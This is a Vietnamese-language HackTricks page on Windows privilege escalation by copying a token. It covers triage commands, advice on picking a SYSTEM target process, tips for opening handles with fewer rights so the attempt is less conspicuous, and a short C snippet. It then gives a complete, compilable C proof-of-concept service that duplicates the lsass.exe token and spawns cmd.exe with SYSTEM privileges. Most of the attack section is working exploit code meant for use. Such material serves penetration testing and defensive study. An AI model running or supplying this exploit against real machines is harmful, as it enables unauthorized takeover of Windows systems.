# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Trang này trình bày biến thể **manual token-theft**, trong đó một context **High Integrity** đã có **`SeDebugPrivilege`** và **`SeImpersonatePrivilege`** mở một process **SYSTEM** phù hợp, **duplicate token** của process đó, rồi **spawn process** mới bằng token này.

Nếu bạn chỉ cần một shell `SYSTEM` nhanh từ một process admin có đặc quyền, hãy xem thêm:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Nếu bạn **không** có đường dẫn đến process handle nhưng có **`SeImpersonatePrivilege`**, cách **named-pipe / Potato** thường dễ hơn:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Phân loại nhanh

Trước khi thử cách copy token, hãy xác nhận process hiện tại đã ở trong một context phù hợp:

```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```

Ghi chú:

- **`SeDebugPrivilege`** cho phép bạn mở nhiều tiến trình SYSTEM **không được bảo vệ**, ngay cả khi DACL của chúng thường sẽ chặn bạn.
- **`SeImpersonatePrivilege`** giúp **`CreateProcessWithTokenW`** trở nên hữu dụng sau đó.
- Nếu đường dẫn sao chép token chỉ cung cấp cho bạn một token SYSTEM yếu hoặc đã bị lọc, hãy đánh cắp token từ **một tiến trình SYSTEM khác**.

## Chọn tiến trình mục tiêu cẩn thận

Kỹ thuật này thường được minh họa với **`lsass.exe`**, nhưng trên Windows hiện đại, đó thường là **mục tiêu sai**:

- Nếu bật **LSA Protection / RunAsPPL**, **`lsass.exe`** được bảo vệ và một tiến trình admin thông thường có `SeDebugPrivilege` vẫn không thể mở nó.<sup>[[2]](#references)</sup>
- Ưu tiên các tiến trình SYSTEM không phải PPL, chẳng hạn như **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** hoặc một phiên bản **`svchost.exe`** khởi chạy sớm.
- **Tiến trình được bảo vệ** và một số tiến trình đặc biệt như **`System`** hoặc **`csrss.exe`** không phải là mục tiêu thực tế cho kỹ thuật này ở user-mode.
- Dùng **Process Hacker / Process Explorer** chạy với quyền elevated để xác minh token của mục tiêu thực sự có các đặc quyền bạn cần trước khi sao chép token đó.

## Chi tiết API quan trọng trong thực tế

Nhiều PoC công khai yêu cầu **`PROCESS_ALL_ACCESS`** và **`TOKEN_ALL_ACCESS`**, nhưng cách đó gây chú ý hơn mức cần thiết. Trong thực tế:

- Mở tiến trình mục tiêu chỉ với những quyền bạn cần (thường là **`PROCESS_QUERY_INFORMATION`** hoặc **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Mở token với các quyền cần thiết để tạo tiến trình: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Dùng **`DuplicateTokenEx(..., TokenPrimary, ...)`** để tạo **primary token**; chỉ có impersonation token thì không đủ để tạo tiến trình mới.
- Nếu **`CreateProcessWithTokenW`** thất bại với mã **`1314`**, hãy chuyển sang **`CreateProcessAsUserW`**.
- Nếu bạn khởi chạy từ **service / Session 0**, hãy nhớ rằng **`CreateProcessWithTokenW`** giữ tiến trình con trong **session của tiến trình gọi**. Nếu cần một shell desktop hiển thị được, hãy dùng **`CreateProcessAsUserW`** và chuyển token sang session mong muốn.<sup>[[1]](#references)</sup>

Một luồng xử lý hiện đại tối giản như sau:

```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
                 SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
                        L"C:\\Windows\\System32\\cmd.exe",
                        NULL, 0, NULL, NULL, &si, &pi);
```

## PoC dịch vụ đầy đủ

Đoạn code sau **khai thác các quyền `SeDebugPrivilege` và `SeImpersonatePrivilege`** để sao chép token từ một **process chạy với quyền SYSTEM** và có **tất cả các token privilege**. Trong trường hợp này, có thể biên dịch code và dùng làm **Windows service binary** để xác minh primitive này hoạt động.<sup>[[3]](#references)</sup>

Phần chính của **code thực hiện nâng quyền** nằm trong hàm **`Exploit`**. Bên trong hàm đó, bạn có thể thấy **`lsass.exe`** được tìm kiếm, **token của nó được sao chép**, và cuối cùng token đó được dùng để khởi chạy một **`cmd.exe`** mới với tất cả privilege của token đã sao chép.

Trên các host hiện đại, bạn thường sẽ muốn thay **`lsass.exe`** bằng một **process SYSTEM không phải PPL** khác, chẳng hạn như **`winlogon.exe`**, **`wininit.exe`** hoặc **`services.exe`**.

Các process khác chạy với quyền SYSTEM và có tất cả hoặc hầu hết token privilege là: **`services.exe`**, **`svchost.exe`** (một số process đầu tiên), **`wininit.exe`**, **`csrss.exe`**... Hãy nhớ rằng nhìn chung bạn **không thể sao chép token từ một protected process**.

```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
			CloseHandle(hProcSnap);
			return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
			if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
					pid = pe32.th32ProcessID;
					break;
			}
		}

	CloseHandle(hProcSnap);

	return pid;
}


int Exploit(void) {

    HANDLE hSystemToken, hSystemProcess;
	HANDLE dupSystemToken = NULL;
    HANDLE hProcess, hThread;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	int pid = 0;


    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

	// open high privileged process
	if ( pid = FindTarget("lsass.exe") )
		hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	else
		return -1;

	// extract high privileged token
    if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
        CloseHandle(hSystemProcess);
        return -1;
    }

	// make a copy of a token
	DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

	// and spawn a new process with higher privs
    CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
						NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
	switch ( controlCode ) {
		case SERVICE_CONTROL_SHUTDOWN:
		case SERVICE_CONTROL_STOP:
			serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
			SetServiceStatus( serviceStatusHandle, &serviceStatus );

			SetEvent( stopServiceEvent );
			return;

		case SERVICE_CONTROL_PAUSE:
			break;

		case SERVICE_CONTROL_CONTINUE:
			break;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
	SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
	// initialise service status
	serviceStatus.dwServiceType = SERVICE_WIN32;
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	serviceStatus.dwControlsAccepted = 0;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;

	serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

	if ( serviceStatusHandle ) {
		// service is starting
		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do initialisation here
		stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

		// running
		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		Exploit();
		WaitForSingleObject( stopServiceEvent, -1 );

		// service was stopped
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do cleanup here
		CloseHandle( stopServiceEvent );
		stopServiceEvent = 0;

		// service is now stopped
		serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );
	}
}


void InstallService() {
	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

	if ( serviceControlManager ) {
		TCHAR path[ _MAX_PATH + 1 ];
		if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
			SC_HANDLE service = CreateService( serviceControlManager,
							serviceName, serviceName,
							SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
							SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
							0, 0, 0, 0, 0 );
			if ( service )
				CloseServiceHandle( service );
		}
		CloseServiceHandle( serviceControlManager );
	}
}

void UninstallService() {
	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

	if ( serviceControlManager ) {
		SC_HANDLE service = OpenService( serviceControlManager,
			serviceName, SERVICE_QUERY_STATUS | DELETE );
		if ( service ) {
			SERVICE_STATUS serviceStatus;
			if ( QueryServiceStatus( service, &serviceStatus ) ) {
				if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
					DeleteService( service );
			}
			CloseServiceHandle( service );
		}
		CloseServiceHandle( serviceControlManager );
	}
}

int _tmain( int argc, TCHAR* argv[] )
{
	if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
		InstallService();
	}
	else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
		UninstallService();
	}
	else  {
		SERVICE_TABLE_ENTRY serviceTable[] = {
			{ serviceName, ServiceMain },
			{ 0, 0 }
		};

		StartServiceCtrlDispatcher( serviceTable );
	}

	return 0;
}
```

## References

- [1] [Hàm CreateProcessWithTokenW (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Cấu hình bảo vệ LSA bổ sung (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Chạy chương trình của tôi dưới dạng dịch vụ (cboard.cprogramming.com) – Windows service skeleton used by the PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)
{{#include ../../banners/hacktricks-training.md}}
